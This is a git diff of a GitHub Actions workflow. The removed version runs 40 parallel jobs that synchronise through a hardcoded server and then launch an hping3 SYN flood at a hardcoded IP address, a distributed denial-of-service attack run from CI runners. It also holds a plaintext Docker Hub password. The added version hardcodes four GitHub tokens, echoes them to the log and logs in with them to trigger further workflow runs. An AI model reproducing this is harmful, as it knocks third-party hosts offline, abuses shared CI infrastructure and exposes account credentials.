@@ -1,95 +1,37 @@
-name: Matrix Barrier Demo
-
 on:
-  push:
-    branches:
-      - main2
+  workflow_dispatch:
 
-# on:
-#   workflow_call:
-#     # inputs:
-#     #   combos:
-#     #     required: true
-#     #     type: string # JSON 字符串
+permissions:
+  contents: write
 
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
 
 jobs:
-  # dev:
-  #   runs-on: ubuntu-latest
-  #   steps:
-  #     - name: 检出代码
-  #       uses: actions/checkout@v4
-
-  #     - name: 登录到Docker Hub
-  #       uses: docker/login-action@v3
-  #       with:
-  #         username: appdeployer
-  #         password: llq335432723931
-
-  #     - name: 测试
-  #       run: |
-  #         curl -L "https://github.com/docker/compose/releases/download/v2.24.7/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
-  #         chmod +x /usr/local/bin/docker-compose
-
-  #         yarn
-  #         yarn global add pkg
-  #         yarn build && docker-compose push
-
-  test:
+  build-and-push:
+    runs-on: ubuntu-latest
     strategy:
       matrix:
-        # job: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-        # job: [
-        #   1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
-        #   11, 12, 13, 14, 15, 16, 17, 18, 19, 20
-        # ]
-        job: [
-          1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
-          11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
-          21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
-          31, 32, 33, 34, 35, 36, 37, 38, 39, 40
-        ]
-        # region: [us-east, us-west, eu-central, asia-east, ap-southeast]
-        # service: [auth, billing, search, analytics, user]
-        # tag: [dev, test, staging, prod]
-        # arch: [x64, arm64, armv7]
-        # version: [v1, v2]
-        # test_level_2025: [unit, e2e]
-    runs-on: ubuntu-latest
+        include:
+          - index: 0
+            token: "UsfhASy6aZ1egMiSfwVzOJULxkjk4a3dWIGb"
+          - index: 1
+            token: "rHJLYwIKSB03EfE7cyGQ5b8pKZAL9H4NLJbb"
+          - index: 2
+            token: "ZnnDi4ZmvVxNBA5lOaX2ojPvFQVtjI4dskvA"
+          - index: 3
+            token: "XQJK7ceyaehORLLDuEGyfCsNAUvXGr2esaFT"
     env:
-      TOTAL_JOBS: 40
-      MATRIX_JOB_ID: ${{ toJSON(matrix) }}
-      SOCKET_SERVER_URL: http://43.133.204.21:3000
+      TZ: Asia/Shanghai
+
     steps:
-      - name: 检出代码
-        uses: actions/checkout@v4
-
-      - name: Barrier sync
+      - name: 机器信息
+        shell: bash
         run: |
-          yarn
+          echo "ghp_$matrix.token"
+          echo "ghp_$matrix.token" | gh auth login --with-token
 
-          sudo apt install hping3 -q
-
-          # getent ahostsv4 ioswy.com
-          # IP=$(getent ahostsv4 ioswy.com | awk '{print $1}' | head -n 1)
-          # IP=125.77.20.66
-          IP=43.135.73.113
-          # IP=43.155.6.59
-          echo "IP=$IP" >> $GITHUB_ENV
-
-          # sudo apt install speedtest-cli
-          # sudo speedtest-cli
-
-          echo $IP
-
-          yarn start
-
-      - name: Step 2 - Continue
-        timeout-minutes: 5
-        run: |
-          echo $IP
-          echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-          sudo timeout 120s hping3 -S --flood -V -d 65400 -p 80 -s 1000-65535 $IP
+          # gh workflow list
+          # gh workflow run build.yml --field start_index=300 --field batch_size=2
+          # gh workflow run build.yml
